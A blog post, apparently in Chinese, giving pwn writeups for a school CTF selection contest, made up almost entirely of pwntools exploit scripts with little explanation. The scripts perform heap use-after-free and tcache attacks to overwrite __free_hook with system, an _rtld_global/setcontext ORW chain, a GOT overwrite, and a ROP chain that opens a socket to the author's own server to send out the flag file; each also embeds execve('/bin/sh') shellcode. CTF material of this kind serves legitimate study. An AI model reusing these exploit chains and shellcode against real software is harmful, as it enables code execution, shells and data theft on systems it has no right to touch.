---
title: 2022 covteamctf pwn Writeup
date: 2022-07-07 17:54:59 +0800
categories:
  - ctf比赛
tags:
  - pwn
  - ctf
permalink: /posts/id=29/
pin: false
published:
---

学校选拔赛的Writeup

## EDGvsDK game1

```python
# _*_ coding:utf-8 _*_
from pwn import *
# context.log_level = 'debug'
context.arch='amd64'

p = process('./pwn1')
p = remote("ctf.joe1sn.top","28080")
elf = ELF("./pwn1")
libc = ELF("./libc-2.27.so")
#elf=ELF('./pwn')

def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add(size):
    sla(">>",'1')
    sla("size:\n",size)

def dele(idx):
    sla(">>",2)
    sla("idx:",idx)

def edit(idx,size,con):
    sla(">>",3)
    sla("idx:",idx)
    sla("size:",size)
    p.sendafter("content:",con)

def show(idx):
    sla(">>",4)
    sla("idx:",idx)

def dbg():
    gdb.attach(p)
    pause()

for i in range(7):
    add(0x10)

#拿堆地址
dele(0)
dele(1)
show(1)
p.recvuntil("content:")
heap=u64(p.recv(6)+'\x00'*2)-0x260+0x10
lg('heap')

# 申请到tcache管理空间，同时恢复tcache结构体功能，保持0x20堆块正常运行
edit(0,0x10,p64(heap))
add(0x10)
add(0x10)
add(0x10)
add(0x10)
add(0x10)
edit(7,0x20,p64(0)*4) # 7即tcache结构体
# 利用uaf申请到tcache结构题内管理0x250堆块的部分
dele(5)# 5-1
edit(5,0x10,p64(heap+0x20))
add(0x10)
add(0x10)
edit(10,0x20,p64(0x0000000007000000))
dele(7)
# 打到unsortbin后切割获取libc
add(0x10)
show(10)

p.recvuntil("content:")
libc_base=u64(p.recv(6)+'\x00'*2)-0x240-96-libc.sym['__malloc_hook']-0x10
lg('libc_base')
free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']
# dbg()
# 恢复一下结构体，进行最后的uaf利用
edit(10,0x20,p64(0)*4)
dele(10)
edit(10,0x20,p64(free_hook))
add(0x10)
add(0x10)
edit(11,0x10,p64(system))
edit(10,0x10,"/bin/sh\x00")
# print "hello"
dele(10)

p.interactive()
```

## EDGvsDK game5

```python
# _*_ coding:utf-8 _*_
from pwn import *
import socket
import struct
# context.log_level='debug'

p = process("./pwn3")
p = remote("ctf.joe1sn.top","8010")
elf = ELF("./pwn3")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
# remote_ip = "127.0.0.1"
# print int(socket.inet_aton(remote_ip),16)


syscall_ret = 0x0000000000401350
pop_rdi = 0x0000000000401355
pop_rsi = 0x0000000000401357
pop_rdx = 0x0000000000401353
pop_rax = 0x0000000000401359
pop_rcx = 0x000000000040135c
# 这2个gadget主要作用就是把rax给rdi
push_rax_pop_rcx = 0x000000000040135b#push rax ; pop rcx ; ret
mov_rdi_rcx = 0x000000000040135e     # mov rdi rcx;ret


#socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
payload = "a"*0x10
payload += p64(pop_rdi)
payload += p64(2)# AF_INET
payload += p64(pop_rsi)
payload += p64(1)# SOCK_STREAM
payload += p64(pop_rdx)
payload += p64(0)# IPPROTO_IP
payload += p64(pop_rax)
payload += p64(41)
payload += p64(syscall_ret)
#connect(soc, (struct sockaddr *)&serv_addr, sizeof(struct sockaddr_in))
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(0x404280)# [ip:socat]_addr
payload += p64(pop_rdx)
payload += p64(16)
payload += p64(pop_rax)
payload += p64(42)
payload += p64(syscall_ret)
#dup2(soc, 1)
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(33)
payload += p64(syscall_ret)
# open flag
payload += p64(pop_rdi)
payload += p64(0x404270)# 'flag'
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall_ret)
#read(rax,0x403400,0x100)
payload += p64(push_rax_pop_rcx)
payload += p64(mov_rdi_rcx)
payload += p64(pop_rsi)
payload += p64(0x404400)
payload += p64(pop_rdx)
payload += p64(0x100)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret)
#write(1,0x403400,0x100)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(syscall_ret)
payload = payload.ljust(0x1d0,"a")
payload += "flag\x00\x00\x00\x00"
payload += "\x00"*8
# 例如127.0.0.1 1000   p64(1000007fe8030002)
# 其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET
payload += p64(0x70909e96e8030002)#改成⾃⼰的服务器的ip端⼝
p.recv()
p.send(payload)

p.interactive()
```

## EDGvsDK game4

```python
# _*_ coding:utf-8 _*_
from pwn import *
# context.log_level = 'debug'
context.arch='amd64'
p = process('./pwn2')
# p = remote("ctf.joe1sn.top","28061")
elf = ELF("./pwn2")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def dbg():
    gdb.attach(p)
    pause()

def add(size,con):
   sla('>>','1')
   sla('Size:',size)
   p.sendafter('Content:',con)

def dele(idx):
   sla('>>','2')
   sla('Index:',idx)

def show(idx):
   sla('>>','3')
   sla('Index:',str(idx))

def edit(idx,con):
   sla('>>','4')
   sla('Index:',str(idx))
   p.sendafter('Content:',con)

#-------------------------leak----------------------------
add(0x520,'e4l4') #0
add(0x428,'e4l4') #1
add(0x500,'e4l4') #2
add(0x428,'e4l4') #3

dele(0)
add(0x600,'c'*0x600) #4
add(0x600,'c'*0x600) #5
show(0)
ru('Content: ')
main_arena = u64(p.recv(6).ljust(8,'\x00'))
libc_base = main_arena-0x21a0f0
lg("libc_base")

rtl_global = libc_base + 0x25f040# p &_rtld_global
lg("rtl_global")

setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
lg('ret')
pop_rdi = libc_base + 0x000000000002a6c5
pop_rsi = libc_base + 0x000000000002c081
pop_rdx = libc_base + 0x000000000005f65a
Open=libc_base+libc.sym['open']
Read=libc_base+libc.sym['read']
Write=libc_base+libc.sym['write']

# p *(struct link_map*)0x7f21c2a52740
edit(0,'a'*0x10)
show(0)
p.recvuntil('a'*0x10)
heap_base = u64(p.recv(6).ljust(8,'\x00'))-0x290
lg("heap_base")
edit(0,p64(main_arena)*2)
#-------------------------------------------------------------

dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtl_global - 0x20))
add(0x600,'e4l4')

fake_heap_addr = heap_base + 0xbf0

flag_addr = fake_heap_addr+0xb0
orw =  p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0xb50)+p64(pop_rdx)+p64(0x50)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)+"flag".ljust(8,'\x00')

payload = p64(0) + p64(libc_base + 0x2607d0) + p64(0) + p64(fake_heap_addr)# _rtld_global+2440
payload += p64(setcontext) + p64(ret)# rdx_addr/call rdx
payload += p64(flag_addr)# rsp
payload += orw# 0x78
payload = payload.ljust(0xc8,'\x00')

payload += p64(fake_heap_addr + 0x28 + 0x18)# rdx+0xa0
payload += p64(pop_rdi)# rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3#
payload += p64(0x10)
payload = payload.ljust(0x31C - 0x10,'\x00')
payload += '\x08'

edit(2,payload)
edit(1,'a'*0x420 + p64(fake_heap_addr + 0x20))# call setcontext
#getshell
p.sendlineafter('>>','5')
sla('your name is?','e4l4')

p.interactive()
```

## FairPwn

```python
# _*_ coding:utf-8 _*_
# 2.23-0ubuntu3_amd64
from pwn import *
context.log_level = 'debug'
context.arch='amd64'

p = process('./pwn4')
elf = ELF("./pwn4")
# libc = ELF("./libc-2.27.so")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------


puts_got = elf.got['puts']

stderr = 0x4040A0
p.sendafter("Please enter your name:",'c'*0x20)
p.sendafter("Please enter your message:",p64(stderr).ljust(0x100,'b'))


ru("Your Message: ")
libc_base = uu64()-0x3c5540
lg('libc_base')

system = libc_base+libc.sym['system']
p.sendafter("Your Name are right?",'F')
p.sendafter("Please enter your name again:",'/bin/sh\x00'+'c'*0x18)
p.sendafter("Your Message are right?",'F')
pl = p64(0x601e28)+p64(libc_base+0x5f0168)+p64(libc_base+0x3e06a0)+p64(system)
p.sendafter('Please enter your Message again: ',pl)

p.interactive()
```

